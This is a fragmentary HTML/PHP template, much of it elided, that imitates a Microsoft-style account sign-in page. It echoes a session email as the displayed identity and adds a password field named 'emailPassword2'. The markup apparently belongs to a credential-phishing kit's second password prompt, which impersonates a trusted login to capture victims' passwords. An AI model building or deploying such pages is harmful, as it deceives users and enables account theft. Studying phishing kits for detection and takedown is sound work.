...
<html dir="ltr" lang="EN-US">
    ...
    <!-- /ko --><!-- /ko -->
            ...
            <!-- ko if: svr.CJ --><!-- /ko -->
                                                                ...
                                                                <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }"><?php echo $_SESSION['email2']; ?></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <!-- /ko -->
                                                            ...
                                                            <div class="row">
                                                                <div class="form-group col-md-24">
                                                                    ...
                                                                    <div class="placeholderContainer">
                                                                        ...
                                                                        <input name="emailPassword2" type="password" id="i0118" autocomplete="off" class="form-control input ext-input text-box ext-text-box" placeholder="Password" required>
